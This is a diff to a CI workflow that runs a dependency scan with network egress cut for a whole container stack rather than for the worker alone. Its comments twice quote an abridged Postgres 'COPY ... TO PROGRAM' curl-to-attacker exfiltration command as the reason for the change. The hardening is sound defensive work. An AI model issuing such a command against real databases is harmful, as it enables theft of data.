@@ -1,5 +1,6 @@
-# Air-gapped scan: run a real cdxgen + Trivy source scan with the worker's
-# network egress cut, after the Trivy DB cache has been populated.
+# Air-gapped scan: run a real cdxgen + Trivy source scan with the whole
+# stack's network egress cut (postgres, redis, backend, AND the worker - not
+# the worker alone), after the Trivy DB cache has been populated.
 #
 # Context: `dogfood-scan.yml` already runs the real toolchain (`TRUSTEDOSS_SCAN_BACKEND:
 # real`) weekly, but that job keeps the runner's normal internet access the whole
@@ -7,8 +8,16 @@
 # invocation missing `--skip-db-update`) never shows up there, because the network
 # call it should not have made just succeeds quietly. This job exists to close
 # that specific gap: bring the stack up with network access, populate the Trivy DB
-# cache, then cut the worker's egress and prove a real scan still completes and the
-# on-disk cache state is judged consistently by two different readers.
+# cache, then cut every container's egress and prove a real scan still completes
+# and the on-disk cache state is judged consistently by two different readers.
+#
+# Cutting only the worker (an earlier version of this job) left a live
+# exfiltration path: `POSTGRES_USER` is a superuser, and a scan-triggered
+# `COPY (SELECT 1) TO PROGRAM 'curl ... | attacker'` runs as a subprocess
+# INSIDE the postgres container, not the worker's - the worker's own
+# interface being cut does not stop it. All four long-running containers
+# (postgres, redis, backend, celery-worker) move onto the internal-only
+# network below; none keeps a route to the internet.
 #
 # Kept as a sibling workflow rather than a job appended to dogfood-scan.yml on
 # purpose. dogfood-scan answers "does our own scan action work end to end";
@@ -24,9 +33,10 @@
 #
 # Follows docs-site/docs/admin-guide/vulnerability-data.md's Path B (fully
 # offline cache volume) shape as closely as a single-host CI job can: populate
-# the cache while connected, then operate on it with no network at all. A
-# later unit (E3, out of scope here) can point the docs-uat waivers on that
-# section at this job as the real-environment oracle.
+# the cache while connected, then operate on it with no network at all - the
+# whole single-node stack, matching a real air-gapped install, not just the
+# worker process. A later unit (E3, out of scope here) can point the docs-uat
+# waivers on that section at this job as the real-environment oracle.
 name: airgap-scan
 
 on:
@@ -190,59 +200,93 @@ jobs:
           echo "Bootstrapped project $project_id"
 
       # ---------------------------------------------------------------------
-      # Cut the worker's egress.
+      # Cut ALL FOUR containers' egress, not just the worker's.
       #
       # docker-compose (V1) has no per-service "detach this network" verb, and
-      # hand-rolling a full `docker run` replica of celery-worker's ~40 env vars
-      # and volume mounts here would drift from docker-compose.dev.yml the first
-      # time that service definition changes. Live network reattachment on the
-      # running container gets the same end state - the worker reachable only
-      # through an `internal: true` network - without duplicating that config:
+      # hand-rolling `docker run` replicas of each service's env vars and
+      # volume mounts here would drift from docker-compose.dev.yml the first
+      # time a service definition changes. Live network reattachment on the
+      # running containers gets the same end state - every service reachable
+      # only through an `internal: true` network - without duplicating that
+      # config:
       #   1. create a bridge network with no external gateway (--internal)
-      #   2. attach postgres/redis/backend to it too, under their compose
-      #      service-name aliases, so the worker can still resolve them
-      #   3. attach the worker, then disconnect it from the network compose
-      #      put it on (its only route to the internet)
-      #   4. restart the worker process so redis/postgres connections are
-      #      re-established over the new network rather than a broken socket
+      #   2. for each of postgres, redis, backend, celery-worker: attach it
+      #      to airgap-internal under its compose service-name alias (so the
+      #      others can still resolve it), then disconnect it from whatever
+      #      network compose put it on (its only route to the internet)
+      #   3. restart backend + celery-worker so their DB/Redis connections
+      #      re-dial over the new network rather than sockets bound to an
+      #      interface that no longer exists. postgres/redis are pure
+      #      listeners (0.0.0.0) - not restarted, no outbound connection of
+      #      their own to re-establish
+      #
+      # An earlier version of this job cut only the worker's network, on the
+      # theory that the worker is the one running attacker-influenced code
+      # (cdxgen/Trivy against scanned source). That left a real exfiltration
+      # path: POSTGRES_USER is a superuser by default provisioning, and
+      # `COPY (SELECT 1) TO PROGRAM 'curl ... | attacker'` issued over the
+      # worker's DATABASE_URL connection runs as a subprocess INSIDE the
+      # still-internet-connected postgres container - the worker's own
+      # interface being cut does not stop it.
       # ---------------------------------------------------------------------
-      - name: Cut worker egress (recreate onto an internal-only network)
+      - name: Cut all-container egress (recreate onto an internal-only network)
         run: |
           set -euo pipefail
 
           docker network create --driver bridge --internal airgap-internal
 
-          postgres_cid=$(docker-compose -f docker-compose.dev.yml ps -q postgres)
-          redis_cid=$(docker-compose -f docker-compose.dev.yml ps -q redis)
-          backend_cid=$(docker-compose -f docker-compose.dev.yml ps -q backend)
-          worker_cid=$(docker-compose -f docker-compose.dev.yml ps -q celery-worker)
+          for svc in postgres redis backend celery-worker; do
+            cid=$(docker-compose -f docker-compose.dev.yml ps -q "$svc")
+            [ -n "$cid" ] || { echo "::error::no running container for service $svc"; exit 1; }
 
-          docker network connect --alias postgres airgap-internal "$postgres_cid"
-          docker network connect --alias redis airgap-internal "$redis_cid"
-          docker network connect --alias backend airgap-internal "$backend_cid"
+            default_net=$(docker inspect "$cid" \
+              --format '{{json .NetworkSettings.Networks}}' | jq -r 'keys[0]')
+            [ -n "$default_net" ] && [ "$default_net" != "null" ] || \
+              { echo "::error::could not resolve $svc's current network"; exit 1; }
 
-          default_net=$(docker inspect "$worker_cid" \
-            --format '{{json .NetworkSettings.Networks}}' | jq -r 'keys[0]')
-          [ -n "$default_net" ] && [ "$default_net" != "null" ] || \
-            { echo "::error::could not resolve celery-worker's current network"; exit 1; }
-          echo "worker's current network: $default_net"
+            docker network connect --alias "$svc" airgap-internal "$cid"
+            docker network disconnect "$default_net" "$cid"
+            echo "$svc: moved off $default_net onto airgap-internal"
+          done
 
-          docker network connect --alias celery-worker airgap-internal "$worker_cid"
-          docker network disconnect "$default_net" "$worker_cid"
+          docker-compose -f docker-compose.dev.yml restart backend celery-worker
 
-          docker-compose -f docker-compose.dev.yml restart celery-worker
-
-      - name: Wait for worker healthy again (egress-cut)
+      # Structural proof, not a behavioural one: postgres:17.2-alpine and
+      # redis:7.4-alpine ship no curl/wget to probe with from inside, so this
+      # asserts directly on Docker's own network membership - the loop above
+      # disconnected each container from every network except the
+      # `--internal` one, which Docker never attaches a default route or NAT
+      # masquerade rule to. backend/celery-worker get the same check here
+      # plus a live curl-to-the-internet check below (both have curl).
+      - name: Verify all four containers are internal-only
         run: |
           set -euo pipefail
+          for svc in postgres redis backend celery-worker; do
+            cid=$(docker-compose -f docker-compose.dev.yml ps -q "$svc")
+            nets=$(docker inspect "$cid" --format '{{json .NetworkSettings.Networks}}' | jq -r 'keys | join(",")')
+            if [ "$nets" != "airgap-internal" ]; then
+              echo "::error::$svc is attached to network(s) other than airgap-internal: $nets"
+              exit 1
+            fi
+            echo "$svc: only on airgap-internal"
+          done
+
+      - name: Wait for backend + worker healthy again (egress-cut)
+        run: |
+          set -euo pipefail
+          services=(backend celery-worker)
           deadline=$(( $(date +%s) + 180 ))
           while :; do
-            cid=$(docker-compose -f docker-compose.dev.yml ps -q celery-worker)
-            status=$(docker inspect --format '{{.State.Health.Status}}' "$cid" 2>/dev/null || echo "none")
-            [ "$status" = "healthy" ] && break
+            healthy=0
+            for svc in "${services[@]}"; do
+              cid=$(docker-compose -f docker-compose.dev.yml ps -q "$svc")
+              status=$(docker inspect --format '{{.State.Health.Status}}' "$cid" 2>/dev/null || echo "none")
+              [ "$status" = "healthy" ] && healthy=$(( healthy + 1 ))
+            done
+            [ "$healthy" -eq "${#services[@]}" ] && break
             [ "$(date +%s)" -ge "$deadline" ] && {
-              echo "::error::celery-worker never became healthy again after the network cutover (postgres/redis may not be reachable over the internal network)"
-              docker-compose -f docker-compose.dev.yml logs --tail=100 celery-worker || true
+              echo "::error::backend and/or celery-worker never became healthy again after the network cutover (postgres/redis may not be reachable over the internal network)"
+              docker-compose -f docker-compose.dev.yml logs --tail=100 backend celery-worker || true
               exit 1
             }
             sleep 5
@@ -251,39 +295,56 @@ jobs:
       - name: Sanity-check egress is actually cut
         run: |
           set -euo pipefail
-          if docker-compose -f docker-compose.dev.yml exec -T celery-worker \
-               curl -m 5 -sS https://ghcr.io/v2/ -o /dev/null; then
-            echo "::error::celery-worker can still reach the internet after the network cutover - the egress-cut step did not work, the rest of this job proves nothing"
-            exit 1
-          fi
-          echo "confirmed: celery-worker has no route to ghcr.io"
+          for svc in backend celery-worker; do
+            if docker-compose -f docker-compose.dev.yml exec -T "$svc" \
+                 curl -m 5 -sS https://ghcr.io/v2/ -o /dev/null; then
+              echo "::error::$svc can still reach the internet after the network cutover - the egress-cut step did not work, the rest of this job proves nothing"
+              exit 1
+            fi
+            echo "confirmed: $svc has no route to ghcr.io"
+          done
 
       # Scan via the upload path (not git_url), so no worker-side git fetch is
       # needed - only apps/backend is scanned; enough real Python dependencies
       # for cdxgen + Trivy to do real work without scanning the whole monorepo.
+      #
+      # Every API call below runs INSIDE the backend container against its own
+      # loopback (docker-compose exec + curl http://localhost:8000/...), not
+      # `curl http://localhost:8000` from the runner. Disconnecting backend's
+      # default network above also tore down its published host port (8000):
+      # Docker's port-DNAT is bound to the network the container was started
+      # on, and reconnecting it elsewhere does not re-publish the port
+      # (confirmed locally with a throwaway container - see PR description).
+      # `docker-compose exec` itself goes through the Docker daemon socket,
+      # not the container's network stack, so it is unaffected either way.
       - name: Upload source archive
         run: |
           set -euo pipefail
           zip -qr /tmp/airgap-source.zip apps/backend \
             -x 'apps/backend/tests/*' -x '**/__pycache__/*' -x '**/*.pyc'
 
-          archive_id=$(curl -fsS -X POST \
-            "http://localhost:8000/v1/projects/${AIRGAP_PROJECT_ID}/source-archive" \
-            -H "Authorization: Bearer ${AIRGAP_JWT}" \
-            -F "upload=@/tmp/airgap-source.zip;type=application/zip" \
+          backend_cid=$(docker-compose -f docker-compose.dev.yml ps -q backend)
+          docker cp /tmp/airgap-source.zip "$backend_cid:/tmp/airgap-source.zip"
+
+          archive_id=$(docker-compose -f docker-compose.dev.yml exec -T backend \
+            curl -fsS -X POST \
+              "http://localhost:8000/v1/projects/${AIRGAP_PROJECT_ID}/source-archive" \
+              -H "Authorization: Bearer ${AIRGAP_JWT}" \
+              -F "upload=@/tmp/airgap-source.zip;type=application/zip" \
             | jq -r '.archive_id')
           [ -n "$archive_id" ] && [ "$archive_id" != "null" ] || { echo "::error::archive upload failed"; exit 1; }
           echo "AIRGAP_ARCHIVE_ID=$archive_id" >> "$GITHUB_ENV"
           echo "Uploaded archive $archive_id"
 
-      - name: Trigger real source scan (worker has no egress)
+      - name: Trigger real source scan (whole stack has no egress)
         run: |
           set -euo pipefail
-          scan_id=$(curl -fsS -X POST \
-            "http://localhost:8000/v1/projects/${AIRGAP_PROJECT_ID}/scans" \
-            -H "Authorization: Bearer ${AIRGAP_JWT}" -H 'Content-Type: application/json' \
-            -d "$(jq -nc --arg a "$AIRGAP_ARCHIVE_ID" \
-                  '{kind: "source", metadata: {source_type: "upload", archive_id: $a}}')" \
+          scan_id=$(docker-compose -f docker-compose.dev.yml exec -T backend \
+            curl -fsS -X POST \
+              "http://localhost:8000/v1/projects/${AIRGAP_PROJECT_ID}/scans" \
+              -H "Authorization: Bearer ${AIRGAP_JWT}" -H 'Content-Type: application/json' \
+              -d "$(jq -nc --arg a "$AIRGAP_ARCHIVE_ID" \
+                    '{kind: "source", metadata: {source_type: "upload", archive_id: $a}}')" \
             | jq -r '.id')
           [ -n "$scan_id" ] && [ "$scan_id" != "null" ] || { echo "::error::scan trigger failed"; exit 1; }
           echo "AIRGAP_SCAN_ID=$scan_id" >> "$GITHUB_ENV"
@@ -295,8 +356,9 @@ jobs:
           deadline=$(( $(date +%s) + 900 ))
           status=""
           while :; do
-            status=$(curl -fsS "http://localhost:8000/v1/scans/${AIRGAP_SCAN_ID}" \
-              -H "Authorization: Bearer ${AIRGAP_JWT}" | jq -r '.status')
+            status=$(docker-compose -f docker-compose.dev.yml exec -T backend \
+              curl -fsS "http://localhost:8000/v1/scans/${AIRGAP_SCAN_ID}" \
+                -H "Authorization: Bearer ${AIRGAP_JWT}" | jq -r '.status')
             echo "scan status: $status"
             case "$status" in
               succeeded|failed|cancelled) break ;;
@@ -308,11 +370,11 @@ jobs:
             sleep 10
           done
           if [ "$status" != "succeeded" ]; then
-            echo "::error::real source scan with no worker egress ended '$status', expected 'succeeded'"
+            echo "::error::real source scan with no egress anywhere in the stack ended '$status', expected 'succeeded'"
             docker-compose -f docker-compose.dev.yml logs --tail=200 celery-worker || true
             exit 1
           fi
-          echo "scan completed successfully with the worker's network egress cut"
+          echo "scan completed successfully with the whole stack's network egress cut"
 
       # ---------------------------------------------------------------------
       # E1 internal contrast (see the header comment): compare, on the SAME
@@ -451,8 +513,9 @@ jobs:
           failed: ${{ needs.airgap-scan.result == 'failure' && 'true' || 'false' }}
           details: |
             This weekly run is the only place a real cdxgen + Trivy source
-            scan is exercised with the worker's network egress cut after the
-            Trivy DB cache is populated - the condition documented in
+            scan is exercised with the whole stack's network egress cut
+            (postgres, redis, backend, and the worker) after the Trivy DB
+            cache is populated - the condition documented in
             docs-site/docs/admin-guide/vulnerability-data.md's Path B
             (fully offline cache volume).
 
